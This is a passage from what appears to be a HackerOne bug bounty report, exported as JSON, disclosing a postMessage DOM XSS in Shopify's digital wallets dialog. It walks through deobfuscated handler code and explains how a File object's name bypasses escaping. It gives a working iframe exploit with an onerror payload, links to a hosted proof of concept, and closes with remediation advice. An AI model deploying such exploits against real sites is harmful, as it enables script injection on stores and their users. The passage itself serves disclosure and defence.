class=\"p\">.</span><span class=\"nx\">classList</span><span class=\"p\">.</span><span class=\"nx\">remove</span><span class=\"p\">(</span><span class=\"s2\">&quot;hidden&quot;</span><span class=\"p\">)</span>\n      <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n        <span class=\"nx\">v</span><span class=\"p\">(</span><span class=\"nx\">inst</span><span class=\"p\">,</span> <span class=\"s2\">&quot;errorDescription&quot;</span><span class=\"p\">,</span> <span class=\"nx\">payload</span><span class=\"p\">.</span><span class=\"nx\">errors</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">])</span>\n        <span class=\"nx\">inst</span><span class=\"p\">.</span><span class=\"nx\">staticElements</span><span class=\"p\">.</span><span class=\"nx\">errorListContainer</span><span class=\"p\">.</span><span class=\"nx\">classList</span><span class=\"p\">.</span><span class=\"nx\">add</span><span class=\"p\">(</span><span class=\"s2\">&quot;hidden&quot;</span><span class=\"p\">)</span>\n      <span class=\"p\">}</span>\n    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span> \n      <span class=\"nx\">e</span><span class=\"p\">.</span><span class=\"nx\">customizableElements</span><span class=\"p\">.</span><span class=\"nx\">errorDescription</span><span class=\"p\">.</span><span class=\"nx\">classList</span><span class=\"p\">.</span><span class=\"nx\">add</span><span class=\"p\">(</span><span class=\"s2\">&quot;hidden&quot;</span><span class=\"p\">)</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">.</span><span class=\"nx\">lineItems</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">v</span><span class=\"p\">(</span><span class=\"nx\">inst</span><span class=\"p\">,</span> <span class=\"s2\">&quot;errorList&quot;</span><span class=\"p\">,</span> <span class=\"nx\">f</span><span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">.</span><span class=\"nx\">lineItems</span><span class=\"p\">))</span> \n    <span class=\"nx\">inst</span><span class=\"p\">.</span><span class=\"nx\">staticElements</span><span class=\"p\">.</span><span class=\"nx\">errorListContainer</span><span class=\"p\">.</span><span class=\"nx\">classList</span><span class=\"p\">.</span><span class=\"nx\">remove</span><span class=\"p\">(</span><span class=\"s2\">&quot;hidden&quot;</span><span class=\"p\">)</span>\n    <span class=\"nx\">v</span><span class=\"p\">(</span><span class=\"nx\">inst</span><span class=\"p\">,</span> <span class=\"s2\">&quot;dismissButton&quot;</span><span class=\"p\">,</span> <span class=\"nx\">payload</span><span class=\"p\">.</span><span class=\"nx\">button</span> <span class=\"o\">||</span> <span class=\"s2\">&quot;Close&quot;</span><span class=\"p\">)</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre>\n<p>The part we&#39;re going to focus on is the <code>payload.lineItems</code> handling. The items are passed into the <code>f</code> function which is defined as follows:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">function</span> <span class=\"nx\">f</span><span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">table</span> <span class=\"o\">=</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">createElement</span><span class=\"p\">(</span><span class=\"s2\">&quot;table&quot;</span><span class=\"p\">)</span>\n  <span class=\"nx\">table</span><span class=\"p\">.</span><span class=\"nx\">className</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;product-table&quot;</span>\n  <span class=\"nx\">table</span><span class=\"p\">.</span><span class=\"nx\">id</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;dialog__product-table&quot;</span>\n  <span class=\"nx\">table</span><span class=\"p\">.</span><span class=\"nx\">innerHTML</span> <span class=\"o\">=</span> <span class=\"nx\">T</span> <span class=\"c1\">// &lt;thead&gt;&lt;tr&gt;...</span>\n  <span class=\"nx\">payload</span><span class=\"p\">.</span><span class=\"nx\">forEach</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">lineItem</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">table</span><span class=\"p\">.</span><span class=\"nx\">tBodies</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">innerHTML</span> <span class=\"o\">+=</span> <span class=\"nx\">m</span><span class=\"p\">(</span><span class=\"nx\">lineItem</span><span class=\"p\">)</span>\n  <span class=\"p\">})</span>\n  <span class=\"k\">return</span> <span class=\"nx\">table</span>\n<span class=\"p\">}</span>\n</code></pre>\n<p>It appears that function creates a table for each <code>lineItem</code> rendering them with the <code>m</code> function:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">function</span> <span class=\"nx\">m</span><span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">escaped</span> <span class=\"o\">=</span> <span class=\"nx\">u</span><span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">)</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">escaped</span><span class=\"p\">.</span><span class=\"nx\">variant</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">return</span> <span class=\"s1\">&#39;\\n      &lt;span class=&quot;product__description__variant order-summary__small-text&quot;&gt;\\n        &#39;</span> <span class=\"o\">+</span> <span class=\"nx\">escaped</span><span class=\"p\">.</span><span class=\"nx\">variant</span> <span class=\"o\">+</span> <span class=\"s2\">&quot;\\n      &lt;/span&gt;&quot;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return</span> <span class=\"s1\">&#39;\\n    &lt;tr class=&quot;product&quot;&gt;\\n      &lt;td class=&quot;product__image&quot;&gt;\\n        &lt;div class=&quot;product-thumbnail&quot;&gt;\\n          &lt;div class=&quot;product-thumbnail__wrapper&quot;&gt;\\n            &lt;img alt=&quot;&#39;</span> <span class=\"o\">+</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">+</span> <span class=\"s1\">&#39;&quot; class=&quot;product-thumbnail__image&quot; src=&quot;&#39;</span> <span class=\"o\">+</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">image</span> <span class=\"o\">+</span> <span class=\"s1\">&#39;&quot;&gt;\\n          &lt;/div&gt;\\n          &lt;span class=&quot;product-thumbnail__quantity&quot; aria-hidden=&quot;true&quot;&gt;&#39;</span> <span class=\"o\">+</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">amount</span> <span class=\"o\">+</span> <span class=\"s1\">&#39;&lt;/span&gt;\\n        &lt;/div&gt;\\n      &lt;/td&gt;\\n      &lt;td class=&quot;product__description&quot;&gt;\\n        &lt;span class=&quot;product__description__name order-summary__emphasis&quot;&gt;&#39;</span> <span class=\"o\">+</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">+</span> <span class=\"s2\">&quot;&lt;/span&gt;\\n        &quot;</span> <span class=\"o\">+</span> <span class=\"nx\">n</span> <span class=\"o\">+</span> <span class=\"s1\">&#39;\\n      &lt;/td&gt;\\n      &lt;td class=&quot;product__quantity visually-hidden&quot;&gt;&#39;</span> <span class=\"o\">+</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">amount</span> <span class=\"o\">+</span> <span class=\"s1\">&#39;&lt;/td&gt;\\n      &lt;td class=&quot;product__status product__status--sold-out&quot;&gt;&#39;</span> <span class=\"o\">+</span> <span class=\"nx\">t</span><span class=\"p\">.</span><span class=\"nx\">message</span> <span class=\"o\">+</span> <span class=\"s2\">&quot;&lt;/td&gt;\\n    &lt;/tr&gt;\\n  &quot;</span>\n<span class=\"p\">}</span>\n</code></pre>\n<p>And again we can verify this assumption by testing it:</p>\n<pre class=\"highlight plaintext\"><code>window.postMessage({\n  type: &quot;DigitalWalletsDialog:change&quot;,\n  digitalWalletsDialog: true,\n  payload: {\n    title: &quot;placeholder&quot;,\n    button: &quot;placeholder&quot;,\n    lineItems: [{\n      name: &quot;product&quot;,\n      amount: &quot;$13.37&quot;,\n      message: &quot;added to cart&quot;\n    }],\n  },\n}, &quot;*&quot;);\n</code></pre>\n<p>And we get the expected result:<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-05-23_at_2.24.34_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/187/326/a896e551f4f0d07897a3e55daaa84baeaace9076/Screen_Shot_2017-05-23_at_2.24.34_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ3XJAUJU3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223803Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEBAaDFhsOVc%2BLBuZJpN2%2FSK3A3ZSLRshQ37cr%2FnNfrsDZBl9Q9MwEJMM1w9f3SvUV6XmoP9nE3PeRToIYvFP152VEnHi03BXq%2BWX7mrp9duCLiSGu%2BuVj85dqXhL9hy5iZ8Baa9Dz1PfTpOuhKCmbaYzCWIDNTGGHjLe%2FHfj5BNMi3SKneAl%2FX0h%2BZqSIdJKDz1SK5Y92eHwZBEL8GznF9GsT%2Fe6zDxKRumhz8Vkk3IGYi5pwUBa6qmtuvb0%2FFBueYSgxUsIbsmK0uIt1sxLJbfLOybgHUA18Z80yVa0KlQc%2BgoSsS484NaEhLTbRqdlZ%2BxywVi8oiNq8ePPGFix9FXwU3HcD5DsyS3oPWa%2BzB9%2FB%2Fj5i%2F%2B%2Fdj%2Fww%2BhTYa6J%2BrE25cJz8f7DhYt5rCg9X8q2TCUwBOYuOUl5A0l4eFCWneCTq2xxhRjl1g1J%2BaAUAShH%2BiAD7%2BKi%2B3APDa6E97UEIGwiReOW1M7p2dsYu%2BTRFAcWFkx%2FfdNcmK%2F1EAANP1i4cT%2FBf2l24Vc5LPZJjCm1RkrTRxc90qzl8fyslqz595eagGsI73K0uzaibH5HvlrUQwLfX4TmlW%2Foze1zEhFUOiAB5qs%2FM3wow8am4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=52eb6550fdb4779c19606110d0e56769c4fa09399cbcd3fbaa1d4bfdb6e87ae4\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/187/326/a896e551f4f0d07897a3e55daaa84baeaace9076/Screen_Shot_2017-05-23_at_2.24.34_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ3XJAUJU3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223803Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEBAaDFhsOVc%2BLBuZJpN2%2FSK3A3ZSLRshQ37cr%2FnNfrsDZBl9Q9MwEJMM1w9f3SvUV6XmoP9nE3PeRToIYvFP152VEnHi03BXq%2BWX7mrp9duCLiSGu%2BuVj85dqXhL9hy5iZ8Baa9Dz1PfTpOuhKCmbaYzCWIDNTGGHjLe%2FHfj5BNMi3SKneAl%2FX0h%2BZqSIdJKDz1SK5Y92eHwZBEL8GznF9GsT%2Fe6zDxKRumhz8Vkk3IGYi5pwUBa6qmtuvb0%2FFBueYSgxUsIbsmK0uIt1sxLJbfLOybgHUA18Z80yVa0KlQc%2BgoSsS484NaEhLTbRqdlZ%2BxywVi8oiNq8ePPGFix9FXwU3HcD5DsyS3oPWa%2BzB9%2FB%2Fj5i%2F%2B%2Fdj%2Fww%2BhTYa6J%2BrE25cJz8f7DhYt5rCg9X8q2TCUwBOYuOUl5A0l4eFCWneCTq2xxhRjl1g1J%2BaAUAShH%2BiAD7%2BKi%2B3APDa6E97UEIGwiReOW1M7p2dsYu%2BTRFAcWFkx%2FfdNcmK%2F1EAANP1i4cT%2FBf2l24Vc5LPZJjCm1RkrTRxc90qzl8fyslqz595eagGsI73K0uzaibH5HvlrUQwLfX4TmlW%2Foze1zEhFUOiAB5qs%2FM3wow8am4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=52eb6550fdb4779c19606110d0e56769c4fa09399cbcd3fbaa1d4bfdb6e87ae4\" class=\"markdown-inline-image\"></a></p>\n\n<h1 id=\"technical-details\">Technical Details</h1>\n\n<p>So now that we have an idea of how the functions behave under normal usage, lets examine how we can exploit them...<br>\nThe main function we&#39;re interested in here is the <code>u</code> which handles escaping all attributes on the payload:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">function</span> <span class=\"nx\">u</span><span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">idx</span> <span class=\"k\">in</span> <span class=\"nx\">payload</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">.</span><span class=\"nx\">hasOwnProperty</span><span class=\"p\">(</span><span class=\"nx\">idx</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n      <span class=\"nx\">payload</span><span class=\"p\">[</span><span class=\"nx\">idx</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">Ve</span><span class=\"p\">.</span><span class=\"nx\">escapeHtml</span><span class=\"p\">(</span><span class=\"nx\">payload</span><span class=\"p\">[</span><span class=\"nx\">idx</span><span class=\"p\">]);</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return</span> <span class=\"nx\">payload</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</code></pre>\n<p>Now if we assume that <code>escapeHtml</code> function does not have any issues/bypasses, we can observe something interesting: The function does not create a &quot;new&quot; escaped object, instead it over-writes properties of the existing object. This means that if we are able to create an object with a controlled property that does not respond to <code>hasOwnProperty</code> it will not be escaped. We can test this locally:</p>\n<pre class=\"highlight javascript\"><code><span class=\"c1\">// Expected to fail:</span>\n<span class=\"nx\">result</span> <span class=\"o\">=</span> <span class=\"nx\">u</span><span class=\"p\">({</span>\n  <span class=\"na\">message</span><span class=\"p\">:</span> <span class=\"s2\">&quot;&#39;\\&quot;&lt;b&gt;\\\\&quot;</span>\n<span class=\"p\">});</span>\n<span class=\"nx\">result</span><span class=\"p\">.</span><span class=\"nx\">message</span> <span class=\"c1\">// &quot;&amp;#39;&amp;quot;&amp;lt;b&amp;gt;\\&quot;</span>\n<span class=\"c1\">// Bypassed:</span>\n<span class=\"nx\">result</span> <span class=\"o\">=</span> <span class=\"nx\">u</span><span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"nb\">Error</span><span class=\"p\">(</span><span class=\"s2\">&quot;&#39;\\&quot;&lt;b&gt;\\\\&quot;</span><span class=\"p\">));</span>\n<span class=\"nx\">result</span><span class=\"p\">.</span><span class=\"nx\">message</span><span class=\"p\">;</span> <span class=\"c1\">// &quot;&#39;&quot;&lt;b&gt;\\&quot;</span>\n</code></pre>\n<p>This is great, but in practice we&#39;re limited to only a few properties that are actually accessed by the HTML template:</p>\n\n<ul>\n<li><code>variant</code></li>\n<li><code>name</code></li>\n<li><code>image</code></li>\n<li><code>message</code></li>\n</ul>\n\n<p>Additionally, we&#39;re limited to only objects which can be passed over postMessage, for example we can&#39;t use the <a href=\"/redirect?signature=95375fa11d7baf2861508cd4914f2b48ecf70328&amp;url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FError\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Error</span><i class=\"icon-external-link\"></i></a> object which already has a <code>message</code> attribute. The list of allowed objects for postMessage is defined as part of the <a href=\"/redirect?signature=68bf5806119615203813985dafb21baf669ed314&amp;url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FWeb_Workers_API%2FStructured_clone_algorithm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>HTML5 structured clone algorithm</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>After a bit of experimentation with each of them, it looks like the <a href=\"/redirect?signature=04b47d4618438ffa2e495e93e1415f2e6e4ffa61&amp;url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FFile\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>File</span><i class=\"icon-external-link\"></i></a> object is perfect for this exploit as it has a read-only <code>name</code> property which is used by our template. We can test it out like so:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">let</span> <span class=\"nx\">f</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">File</span><span class=\"p\">([</span><span class=\"s2\">&quot;data&quot;</span><span class=\"p\">],</span> <span class=\"s2\">&quot;controlledvalue&quot;</span><span class=\"p\">);</span>\n<span class=\"nx\">f</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"p\">;</span> <span class=\"c1\">// &quot;controlledvalue&quot;</span>\n<span class=\"nx\">f</span><span class=\"p\">.</span><span class=\"nx\">hasOwnProperty</span><span class=\"p\">(</span><span class=\"s2\">&quot;name&quot;</span><span class=\"p\">);</span> <span class=\"c1\">// false</span>\n</code></pre>\n<p>Putting this all together with an iframe to make it clean we get the final exploit:</p>\n<pre class=\"highlight javascript\"><code><span class=\"kd\">let</span> <span class=\"nx\">shop</span> <span class=\"o\">=</span> <span class=\"nx\">prompt</span><span class=\"p\">(</span><span class=\"s2\">&quot;Enter a Target Shop URL:&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;https://bored-engineering-whitehat-2.myshopify.com&quot;</span><span class=\"p\">);</span>\n<span class=\"kd\">let</span> <span class=\"nx\">frame</span> <span class=\"o\">=</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">createElement</span><span class=\"p\">(</span><span class=\"s2\">&quot;iframe&quot;</span><span class=\"p\">);</span>\n<span class=\"nx\">frame</span><span class=\"p\">.</span><span class=\"nx\">src</span> <span class=\"o\">=</span> <span class=\"s2\">`</span><span class=\"p\">${</span><span class=\"nx\">shop</span><span class=\"p\">}</span><span class=\"s2\">/1337/digital_wallets/dialog`</span><span class=\"p\">;</span>\n<span class=\"nx\">frame</span><span class=\"p\">.</span><span class=\"nx\">style</span><span class=\"p\">.</span><span class=\"nx\">display</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;none&quot;</span><span class=\"p\">;</span>\n<span class=\"nx\">frame</span><span class=\"p\">.</span><span class=\"nx\">onload</span> <span class=\"o\">=</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nx\">frame</span><span class=\"p\">.</span><span class=\"nx\">contentWindow</span><span class=\"p\">.</span><span class=\"nx\">postMessage</span><span class=\"p\">({</span>\n    <span class=\"na\">type</span><span class=\"p\">:</span> <span class=\"s2\">&quot;DigitalWalletsDialog:change&quot;</span><span class=\"p\">,</span>\n    <span class=\"na\">digitalWalletsDialog</span><span class=\"p\">:</span> <span class=\"kc\">true</span><span class=\"p\">,</span>\n    <span class=\"na\">payload</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n      <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"s2\">&quot;placeholder&quot;</span><span class=\"p\">,</span>\n      <span class=\"na\">button</span><span class=\"p\">:</span> <span class=\"s2\">&quot;placeholder&quot;</span><span class=\"p\">,</span>\n      <span class=\"na\">lineItems</span><span class=\"p\">:</span> <span class=\"p\">[</span><span class=\"k\">new</span> <span class=\"nx\">File</span><span class=\"p\">([</span><span class=\"s2\">&quot;&quot;</span><span class=\"p\">],</span> <span class=\"s2\">&quot;&lt;img src=xx: onerror=alert(document.domain)&gt;&quot;</span><span class=\"p\">)],</span>\n    <span class=\"p\">},</span>\n  <span class=\"p\">},</span> <span class=\"s2\">&quot;*&quot;</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n<span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">appendChild</span><span class=\"p\">(</span><span class=\"nx\">frame</span><span class=\"p\">);</span>\n</code></pre>\n<h1 id=\"exploitability\">Exploitability</h1>\n\n<p>As shown in the proof of concept below, the exploit can be hidden in an iframe and requires no user interaction what-so-ever. Additionally, it appears to affect every Shopify shop. With that said, the injection occurs within the <code>/:id/digital_wallets/dialog</code> route which is not under <code>/admin</code>, though at this point in time it would be trivial to escalate that access to the <code>/admin</code> route. </p>\n\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n\n<p>I&#39;ve hosted a simple PoC at <a href=\"/redirect?signature=448a1dfbdd887ab0b53eca01e79cbe6e13806ff1&amp;url=https%3A%2F%2Fattackerdoma.in%2Fde43386b-cbea-4427-89f7-90e269b9b72a.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://attackerdoma.in/de43386b-cbea-4427-89f7-90e269b9b72a.html</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<h1 id=\"remediation\">Remediation</h1>\n\n<p>This issue could be fixed either within the <code>u</code> function, or by preventing anything except primitives from being passed over the postMessage channel. Typically this is accomplished by running <code>JSON.parse</code> on the message, and exiting the handling if parsing fails. </p>\n", 
    "vulnerability_information": "# Description\nThe `/:id/digital_wallets/dialog` endpoint is used to display a small dialog box relating to the \"digital wallets\" functionality on a shop. The endpoint includes a script that listens for postMessages without validating the origin of messages. However, the impact of the missing validation is very limited because the script attempts to escape any content to prevent any HTML injection. By sending a specially crafted postMessage containing a \"clone-able\" object (per the [HTML5 structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm)) this escaping can be bypassed allowing a malicious actor to obtain XSS. \n\n# Technical Background\nNote: For the sake of clarity I've renamed some of the variables and re-written sections of code to only include the relevant functions from [the minified JavaScript](https://cdn.shopify.com/s/assets/services/digital_wallets/scripts-e4c6841a7e9dfd3216a6cc52da1313648ea3b449f388411eac2f260b3f7f36f6.js) so this report is easier to understand...\nThe [/:id/digital_wallets/dialog](https://bored-engineering-whitehat-2.myshopify.com/1337/digital_wallets/dialog) route initializes a postMessage listener on page load that looks like this:\n```js\nthis._messageHandler = function(event) {\n  if (event.data) {\n    if (event.data.type && event.data.digitalWalletsDialog) {\n      c(i, event.data.type, event.data.payload);\n    }\n  }\n}\nthis._localWindow.addEventListener(\"message\", this._messageHandler)\n```\nThe `c` function which handles the message is responsible for a few different message types, in this case we're only interested in the `DigitalWalletsDialog:change` type:\n```js\nfunction c(inst, type, payload) {\n  switch (type) {\n    case ze.DIALOG_CHANGE: // DigitalWalletsDialog:change\n      if (d(payload)) { // Check that the required fields are present\n        g(inst) // Reset the DOM\n        p(inst, payload) // Insert the payload into the DOM\n...\n```\nAs noted in my previous comments the `d` function and `g` function are relatively straightforward and un-interesting:\n```js\nfunction d(payload) {\n  var required = [\"title\", \"button\"]\n  for (var idx = 0; idx < required.length; idx++)\n    if (!payload[required[idx]] || \"\" === !payload[required[idx]]) {\n      return false\n    }\n    return true\n}\nfunction g(inst) {\n  for (var idx in inst.customizableElements) {\n    inst.customizableElements[idx].innerHTML = \"\"\n    inst.customizableElements[idx].classList.remove(\"hidden\")\n  }\n  inst.customizableElements.errorList.scrollTop = 0\n}\n```\nUnderstanding all of the previous pieces, we can pass a legitimate message through the functions like so:\n```js\nwindow.postMessage({\n  type: \"DigitalWalletsDialog:change\",\n  digitalWalletsDialog: true,\n  payload: {\n    title: \"placeholder\",\n    button: \"placeholder\"\n  },\n}, \"*\");\n```\nAnd when we do the dialog renders as expected:\n{F187323}\nLooking more into the `p` function we see it is responsible for setting/creating the values for a number of elements on the DOM:\n```js\nfunction p(inst, payload) {\n  _(inst, t.icon)\n  v(inst, \"title\", payload.title)\n  if (payload.errors) {\n    if (Array.isArray(payload.errors)) {\n      if (payload.errors.length > 1) {\n        v(inst, \"errorList\", h(payload.errors))\n        inst.customizableElements.errorDescription.classList.add(\"hidden\")\n        inst.staticElements.errorListContainer.classList.remove(\"hidden\")\n      } else {\n        v(inst, \"errorDescription\", payload.errors[0])\n        inst.staticElements.errorListContainer.classList.add(\"hidden\")\n      }\n    } else { \n      e.customizableElements.errorDescription.classList.add(\"hidden\")\n    }\n  }\n  if (payload.lineItems) {\n    v(inst, \"errorList\", f(payload.lineItems)) \n    inst.staticElements.errorListContainer.classList.remove(\"hidden\")\n    v(inst, \"dismissButton\", payload.button || \"Close\")\n  }\n}\n```\nThe part we're going to focus on is the `payload.lineItems` handling. The items are passed into the `f` function which is defined as follows:\n```js\nfunction f(payload) {\n  var table = document.createElement(\"table\")\n  table.className = \"product-table\"\n  table.id = \"dialog__product-table\"\n  table.innerHTML = T // <thead><tr>...\n  payload.forEach(function(lineItem) {\n    table.tBodies[0].innerHTML += m(lineItem)\n  })\n  return table\n}\n```\nIt appears that function creates a table for each `lineItem` rendering them with the `m` function:\n```js\nfunction m(payload) {\n  var escaped = u(payload)\n  if (escaped.variant) {\n    return '\\n      <span class=\"product__description__variant order-summary__small-text\">\\n        ' + escaped.variant + \"\\n      </span>\"\n  }\n  return '\\n    <tr class=\"product\">\\n      <td class=\"product__image\">\\n        <div class=\"product-thumbnail\">\\n          <div class=\"product-thumbnail__wrapper\">\\n            <img alt=\"' + t.name + '\" class=\"product-thumbnail__image\" src=\"' + t.image + '\">\\n          </div>\\n          <span class=\"product-thumbnail__quantity\" aria-hidden=\"true\">' + t.amount + '</span>\\n        </div>\\n      </td>\\n      <td class=\"product__description\">\\n        <span class=\"product__description__name order-summary__emphasis\">' + t.name + \"</span>\\n        \" + n + '\\n      </td>\\n      <td class=\"product__quantity visually-hidden\">' + t.amount + '</td>\\n      <td class=\"product__status product__status--sold-out\">' + t.message + \"</td>\\n    </tr>\\n  \"\n}\n``` \nAnd again we can verify this assumption by testing it:\n```\nwindow.postMessage({\n  type: \"DigitalWalletsDialog:change\",\n  digitalWalletsDialog: true,\n  payload: {\n    title: \"placeholder\",\n    button: \"placeholder\",\n    lineItems: [{\n      name: \"product\",\n      amount: \"$13.37\",\n      message: \"added to cart\"\n    }],\n  },\n}, \"*\");\n```\nAnd we get the expected result:\n{F187326}\n\n# Technical Details\nSo now that we have an idea of how the functions behave under normal usage, lets examine how we can exploit them...\nThe main function we're interested in here is the `u` which handles escaping all attributes on the payload:\n```js\nfunction u(payload) {\n  for (var idx in payload) {\n    if (payload.hasOwnProperty(idx)) {\n      payload[idx] = Ve.escapeHtml(payload[idx]);\n    }\n  }\n  return payload;\n}\n```\nNow if we assume that `escapeHtml` function does not have any issues/bypasses, we can observe something interesting: The function does not create a \"new\" escaped object, instead it over-writes properties of the existing object. This means that if we are able to create an object with a controlled property that does not respond to `hasOwnProperty` it will not be escaped. We can test this locally:\n```js\n// Expected to fail:\nresult = u({\n  message: \"'\\\"<b>\\\\\"\n});\nresult.message // \"&#39;&quot;&lt;b&gt;\\\"\n// Bypassed:\nresult = u(new Error(\"'\\\"<b>\\\\\"));\nresult.message; // \"'\"<b>\\\"\n```\nThis is great, but in practice we're limited to only a few properties that are actually accessed by the HTML template:\n\n* `variant`\n* `name`\n* `image`\n* `message`\n\nAdditionally, we're limited to only objects which can be passed over postMessage, for example we can't use the [Error](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error) object which already has a `message` attribute. The list of allowed objects for postMessage is defined as part of the [HTML5 structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm).\n\nAfter a bit of experimentation with each of them, it looks like the [File](https://developer.mozilla.org/en-US/docs/Web/API/File) object is perfect for this exploit as it has a read-only `name` property which is used by our template. We can test it out like so:\n```js\nlet f = new File([\"data\"], \"controlledvalue\");\nf.name; // \"controlledvalue\"\nf.hasOwnProperty(\"name\"); // false\n```\nPutting this all together with an iframe to make it clean we get the final exploit:\n```js\nlet shop = prompt(\"Enter a Target Shop URL:\", \"https://bored-engineering-whitehat-2.myshopify.com\");\nlet frame = document.createElement(\"iframe\");\nframe.src = `${shop}/1337/digital_wallets/dialog`;\nframe.style.display = \"none\";\nframe.onload = () => {\n  frame.contentWindow.postMessage({\n    type: \"DigitalWalletsDialog:change\",\n    digitalWalletsDialog: true,\n    payload: {\n      title: \"placeholder\",\n      button: \"placeholder\",\n      lineItems: [new File([\"\"], \"<img src=xx: onerror=alert(document.domain)>\")],\n    },\n  }, \"*\");\n}\ndocument.body.appendChild(frame);\n```\n\n# Exploitability\nAs shown in the proof of concept below, the exploit can be hidden in an iframe and requires no user interaction what-so-ever. Additionally, it appears to affect every Shopify shop. With that said, the injection occurs within the `/:id/digital_wallets/dialog` route which is not under `/admin`, though at this point in time it would be trivial to escalate that access to the `/admin` route. \n\n# Proof of Concept\nI've hosted a simple PoC at [https://attackerdoma.in/de43386b-cbea-4427-89f7-90e269b9b72a.html](https://attackerdoma.in/de43386b-cbea-4427-89f7-90e269b9b72a.html).\n\n# Remediation\nThis issue could be fixed either within the `u` function, or by preventing anything except primitives from being passed over the postMessage channel. Typically this is accomplished by running `JSON.parse` on the message, and exiting the handling if parsing fails. ", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.shopify.com", 
            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.", 
            "twitter_handle": "", 
            "name": "Shopify"
        }, 
